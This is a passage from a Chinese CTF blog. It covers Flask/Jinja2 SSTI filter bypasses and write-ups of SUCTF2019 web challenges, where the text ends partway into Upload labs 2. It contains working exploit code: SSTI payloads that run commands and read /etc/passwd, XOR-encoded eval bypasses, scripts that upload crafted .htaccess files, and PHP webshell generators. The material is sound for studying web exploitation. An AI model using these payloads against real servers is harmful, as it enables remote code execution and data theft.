<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__base__.__subclasses__()</span><br><span class="line"><span class="comment"># 返回子类的列表 [,,,...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#从中随便选一个类,查看它的__init__</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">30</span>].__init__</span><br><span class="line">&lt;slot wrapper <span class="string">'__init__'</span> of <span class="string">'object'</span> objects&gt;</span><br><span class="line"><span class="comment"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#再换几个子类，很快就能找到一个重载过__init__的类，比如</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">5</span>].__init__</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__base__.__subclasses__()[<span class="number">5</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>]</span><br><span class="line"><span class="comment">#然后用eval执行命令即可</span></span><br></pre></td></tr></table></figure>

<p>之前看不是很懂，现在明白了。第三个点是在看一篇博文中发现的问题–<strong>Python的一切皆对象思想</strong></p>
<p><code>Python</code>一切皆对象，对于获取<code>object</code>类，传统的获取方式是<code>().__class__.__base__.subclasses__</code>，但是看到一篇博客后，一些沙雕的局限思维被打开了，这个过滤的部分如下</p>
<ul>
<li>config</li>
<li>class</li>
<li>mro</li>
<li>args</li>
<li>request</li>
<li>open</li>
<li>eval</li>
<li>builtins</li>
<li>import</li>
</ul>
<p>过滤掉了<code>class和request</code>有点致命,也就是说我们无法通过<code>[].__class__.__base__.__subclasses__()</code>这种操作获取基类，也无法通过<code>[][request.args.class]&amp;class=__class__</code>获取<code>object</code>,但是因为python的一切皆是对象思想,这里的<code>session</code>关键字并没有被过滤，其实<code>session</code>和<code>config</code>也是对象,我们可以通过<code>session</code>构造出<code>object</code>，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__bases__[0].__bases__[0].__bases__[0]</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/07/ZBOhFg.png" alt="ZBOhFg.png"></p>
<p>接着可以通过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;session[<span class="string">'__cla'</span>+<span class="string">'ss__'</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__subclasses__ &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>遍历出所有子类，但是这里class被过滤了，所以只能通过<code>__bases__[0][&#39;__subcl&#39;+&#39;asses__&#39;]</code>进行获取子类，再接着在里面找我们要找的危险类，这位师傅找的是<code>os._wrap_close</code>,不过我并没有在自己的<code>python2.7</code>本地环境找到这个<code>class</code>，最终payload为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; session[<span class="string">'__cla'</span>+<span class="string">'ss__'</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>][<span class="string">'__subcla'</span>+<span class="string">'sses__'</span>]()[<span class="number">312</span>].__init__.__globals__[<span class="string">'po'</span>+<span class="string">'pen'</span>](<span class="string">'ls /'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我本地模拟构造的为</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/?name=&#123;&#123;session[%27__cla%27+%27ss__%27].__bases__[0].__bases__[0].__bases__[0].__bases__[0][%27__subc%27+%27lasses__%27]()[40](%27/etc/passwd%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>成功读取了<code>/etc/passwd</code></p>
<p>第二点学到是<code>__enter__与__init__</code>的相似性</p>
<blockquote>
<p><code>object.__enter__</code>(<em>self</em>)</p>
<p>Enter the runtime context related to this object. The <a href="https://docs.python.org/zh-cn/2.7/reference/compound_stmts.html#with" target="_blank" rel="noopener"><code>with</code></a> statement will bind this method’s return value to the target(s) specified in the <a href="https://docs.python.org/zh-cn/2.7/reference/compound_stmts.html#as" target="_blank" rel="noopener"><code>as</code></a> clause of the statement, if any.</p>
</blockquote>
<p>上文为官方文档的描述，也就是我们同样可以通过<code>___enter__</code>来进入我们的对象取代<code>__init__</code>的过滤。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://docs.python.org/zh-cn/2.7/reference/datamodel.html?highlight=__enter__#object.__enter__" target="_blank" rel="noopener">https://docs.python.org/zh-cn/2.7/reference/datamodel.html?highlight=__enter__#object.__enter__</a></p>
<p><a href="https://drops.org.cn/Python/flask-jinja2-ssti.html#directory04395356149972733410" target="_blank" rel="noopener">https://drops.org.cn/Python/flask-jinja2-ssti.html#directory04395356149972733410</a></p>
<p>[<a href="https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/]" target="_blank" rel="noopener">https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/]</a>(</p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF2019</title>
    <url>/2019/08/27/SUCTF2019/</url>
    <content><![CDATA[<h3 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h3><p>相对其他题来说比较简单的一道题，所用到的文件是<code>.user.ini</code>，所用范围要比.htaccess的范围要广一些，首先上传.user.ini文件</p>
<p><img src="https://s2.ax1x.com/2019/08/21/mNyluV.png" alt="mNyluV.png"></p>
<p>通过auto_prepend_file指定要包含的文件，再上传这个文件</p>
<p><img src="https://s2.ax1x.com/2019/08/21/mN6Jqf.png" alt="mN6Jqf.png"></p>
<p>成功写入木马，访问目录下的index.php，此时index.php已经包含了2.png的一句话代码。</p>
<p><strong>PS：如果了解过这个知识点的话，其实这道题的提示还是很明显的，给了一个空的index.php，目的就是让人去思考这个文件的作用，进而去想到.user.ini。</strong></p>
<h3 id="Easyweb"><a href="#Easyweb" class="headerlink" title="Easyweb"></a>Easyweb</h3><p>题目比较直接，上来就给了代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>题目目的还是很明确的，通过eval调用get_the_flag函数，然后上传文件bypass，最后拿到shell，然后得到flag.</p>
<p>首先需要通过eval去调用get_the_flag函数，（PS:不得不说php的黑科技真的是多…我之前一直以为异或是要加双引号或者单引号的…通过这个题..长知识了)。</p>
<p>因为这道题ban掉了所有数字和字母，当然还有很多符号，如<code>[,&#39;,&quot;</code>等，所以用的也不是常规的异或构造的字符，这里用的是十六进制异或字符的构造，payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;%A0%B8%BA%AB^%ff%ff%ff%ff&#125;&#123;%A0&#125;();&amp;%A0&#x3D;get_the_flag</span><br></pre></td></tr></table></figure>

<p>说到这里.，我自己写了一个小工具，虽然有点不稳定(在linux上，windows还是蛮稳定的，还是蛮有实用价值的，链接如下：<a href="https://github.com/lihuaiqiu/XorShell" target="_blank" rel="noopener">https://github.com/lihuaiqiu/XorShell</a></p>
<p>使用截图</p>
<p><img src="https://s2.ax1x.com/2019/08/22/mw7RED.png" alt="mw7RED.png"></p>
<p>这里不需要引号的原因是</p>
<p>php的经典特性<code>Use of undefined constant</code>，（赛后看出题人的解释知道的..涨知识了，这个特性会将代码中没有引号的都自动作为字符串(Ascii码大于0x7F)，所以通过上面的十六进制可以bypass,调用get_the_flag函数，接着来考虑的是bypass如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有三次检测，第一次是匹配后缀的ph字符串，第二次是看文件内容中有无<code>&lt;?</code>，第三次是调用exif_imagetype函数看看是不似乎符合这个函数要的图片。</p>
<p>首先看一下符合exif_imagetype的文件格式</p>
<p><img src="https://s2.ax1x.com/2019/08/26/mRRMwt.png" alt="mRRMwt.png"></p>
<p>这里并没有ban掉htaccess，但是把php ban的很严格，所以我们可以上传htaccess来把我们要的格式解析为php，但这里htaccess也要考虑一些东西，首先必须要可以让htaccess文件正确解析，但是还得符合图片的格式，<strong>在htaccess中#可以注释，还有一种就是把该行用\x00开头，这样配置文件也会把该行作为无效行解析</strong>，<strong>既然这样，我们就有两种绕过手段，第一种是使用注释来标记文件头，第二种是文件头以\x00开头的文件</strong>，原作者给的是xbm文件(第一种，使用注释来标记文件头)</p>
<p>参考链接</p>
<p><a href="https://thibaudrobin.github.io/articles/bypass-filter-upload/" target="_blank" rel="noopener">https://thibaudrobin.github.io/articles/bypass-filter-upload/</a></p>
<p>这样我们就可以通过脚本来生成可以绕过上传.htaccess文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">xbmhtaccess=<span class="string">b"""</span></span><br><span class="line"><span class="string">#define width 1</span></span><br><span class="line"><span class="string">#define height 1</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .qiu</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=zenis.qiu"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">url=<span class="string">"http://3f165c30-20ac-4c51-8d4a-742208486edc.node1.buuoj.cn/?_=$%7B%86%9E%9C%8D%5E%d9%d9%d9%d9%7D%7B%d9%7D();&amp;%d9=get_the_flag"</span></span><br><span class="line"><span class="comment">#upload</span></span><br><span class="line">files=&#123;</span><br><span class="line">	<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,xbmhtaccess,<span class="string">'image/png'</span>)</span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,files=files)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<p>这里我写的是base64编码绕过，原作者用的是utf16，也贴一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span><span class="params">()</span>:</span></span><br><span class="line">htaccess = open(<span class="string">'..htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.write(SIZE_HEADER)</span><br><span class="line">htaccess.write(<span class="string">b'AddType application/x-httpd-php .php16\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.close()</span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br></pre></td></tr></table></figure>

<p>原作者最终的exp为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SIZE_HEADER = <span class="string">b"\n\n#define width 1337\n#define height 1337\n\n"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span><span class="params">(filename, script)</span>:</span></span><br><span class="line">phpfile = open(filename, <span class="string">'wb'</span>) </span><br><span class="line"></span><br><span class="line">phpfile.write(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span><span class="params">()</span>:</span></span><br><span class="line">htaccess = open(<span class="string">'..htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.write(SIZE_HEADER)</span><br><span class="line">htaccess.write(<span class="string">b'AddType application/x-httpd-php .php16\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">htaccess.write(<span class="string">b'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.close()</span><br><span class="line"></span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">"webshell.php16"</span>, <span class="string">"&lt;?php system($_GET['cmd']); die(); ?&gt;"</span>)</span><br><span class="line">generate_php_file(<span class="string">"scandir.php16"</span>, <span class="string">"&lt;?php echo implode('\n', scandir($_GET['dir'])); die(); ?&gt;"</span>)</span><br><span class="line">generate_php_file(<span class="string">"getfile.php16"</span>, <span class="string">"&lt;?php echo file_get_contents($_GET['file']); die(); ?&gt;"</span>)</span><br><span class="line">generate_php_file(<span class="string">"info.php16"</span>, <span class="string">"&lt;?php phpinfo(); die(); ?&gt;"</span>)</span><br></pre></td></tr></table></figure>

<p>第二种就是以\x00开头的文件了，wbmp就是这样的文件，不过看ico也是，不过试了一下似乎没成功</p>
<p>来看一下wbmp的文件头….我是生成的wbmp文件，和一些师傅的wp的似乎有些不同，不过也可以成功（Orz，因为第三位是宽度，第四位是高度，后面是数据，所以不一样</p>
<p><a href="https://imgchr.com/i/mR7T91" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/26/mR7T91.png" alt="mR7T91.png"></a></p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">"http://de662a31-6d37-4204-a412-1af93fda3ee9.node1.buuoj.cn?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line">htaccess=<span class="string">b"""\x00\x00\x85\x48\x85\x18</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .test</span></span><br><span class="line"><span class="string">php_value auto_append_file  "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/1.test"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">shell=<span class="string">b"GIF89a"</span>+<span class="string">b"aa"</span>+base64.b64encode(<span class="string">b"&lt;?php phpinfo()?&gt;"</span>) <span class="comment">#aa为了满足base64算法凑足八个字节</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#first_upload ---- to upload .htaccess</span></span><br><span class="line"></span><br><span class="line">files1=&#123;</span><br><span class="line">	<span class="string">'file'</span>:(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>)</span><br><span class="line">&#125;</span><br><span class="line">r1=requests.post(url=url,files=files1)</span><br><span class="line"><span class="keyword">print</span> r1.text</span><br><span class="line"></span><br><span class="line"><span class="comment">#second_upload ---- to upload .shell</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">files2=&#123;</span><br><span class="line">	<span class="string">'file'</span>:(<span class="string">'1.test'</span>,shell)</span><br><span class="line">&#125;</span><br><span class="line">r1=requests.post(url,files=files2)</span><br><span class="line"><span class="keyword">print</span> r1.text</span><br></pre></td></tr></table></figure>

<p>这里解释一下htaccess的配置信息的意思</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .test</span><br><span class="line">php_value auto_append_file  &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_fd40c7f4125a9b9ff1a4e75d293e3080&#x2F;1.test&quot;</span><br></pre></td></tr></table></figure>

<p>1.将.test后缀的以php进行解析</p>
<p>2.在加载完php文件后去包含base64解码后的1.test</p>
<p>模拟一下配置文件作用于1.test的流程</p>
<p>首先将1.test以php的方式解析，在1.test加载完毕后，再次包含base64解码后的1.test，成功getshell，所以这也就是为什么会出现两次1.test内容的原因，第一次是没有经过base64解密的，第二次是经过解密并且转化为php了的。</p>
<p><a href="https://imgchr.com/i/mROQJJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/26/mROQJJ.png" alt="mROQJJ.png"></a></p>
<h3 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h3><p>进入题目给出源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure>

<p>这个题目进行了多次对host的检测，当时着急坐火车没太看..其实就是我之前看过的blackhat提出的一个unicode安全问题，还是先分析一下代码逻辑</p>
<p>分别用urlparse与urllib对host进行检测，最后把host分开，每个单词先进行idna编码再进行utf-8解码，形成新的host，最后再进行urlparse然后这时的host如果等于suctf.cc那么就会进行urlopen。其实这里的先编码再解码也给的太明显了…..，看这个就可以想到这个unicode安全问题，用脚本跑一下跑出可用的unicode字符，脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_true_unicode</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65537</span>):</span><br><span class="line">                a=chr(i)</span><br><span class="line">                url1=<span class="string">"http://suctf.c&#123;&#125;/test.txt"</span>.format(a)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> get_true_url(url1) == <span class="literal">True</span>:</span><br><span class="line">                        print(a)</span><br><span class="line">                        print(<span class="string">"\\x"</span>+hex(i)[<span class="number">2</span>:])</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_true_url</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">get_true_unicode()</span><br></pre></td></tr></table></figure>

<p>跑出如下字符</p>
<p><img src="https://s2.ax1x.com/2019/08/26/mfWb28.png" alt="mfWb28.png"></p>
<p>随便找一个看起来好看一些的字符，这里suctf.cc应该是和localhost进行了绑定，读一下nginx配置文件</p>
<p><img src="https://s2.ax1x.com/2019/08/26/mfhR7d.png" alt="mfhR7d.png"></p>
<p>这里在配置文件用alias指定了flag资源的真实请求位置为/usr/fffffflag,访问这个位置即可拿到flag</p>
<p><a href="https://imgchr.com/i/mf4iB4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/26/mf4iB4.png" alt="mf4iB4.png"></a></p>
<h3 id="Upload-labs-2"><a href="#Upload-labs-2" class="headerlink" title="Upload labs 2"></a>Upload labs 2</h3><p>题目有两个功能，第一个是传文件，第二个是提交传文件后给你的路径可以得到文件的类型，是一个源码审计的题目，下面就来看一看</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line"></span><br><span class="line">$userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    <span class="comment">// 允许上传的图片后缀</span></span><br><span class="line">    $allowedExts = <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $file_name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $temp = explode(<span class="string">"."</span>, $file_name);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    <span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">            || ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">        &amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">        &amp;&amp; in_array($extension, $allowedExts)</span><br><span class="line">    ) &#123;</span><br><span class="line">        $c = <span class="keyword">new</span> Check($tmp_name);</span><br><span class="line">        $c-&gt;check();</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($tmp_name, $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . $userdir . <span class="string">"/"</span> . md5($file_name) . <span class="string">"."</span> . $extension;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>限制很严格，应该不存在绕过的方法，分别对Content-Type和后缀名进行了检测，并且后缀名是白名单，不太可能突破，接着看一下其他地方的代码</p>
<p>第二个功能是查看自己文件的type，代码如下</p>
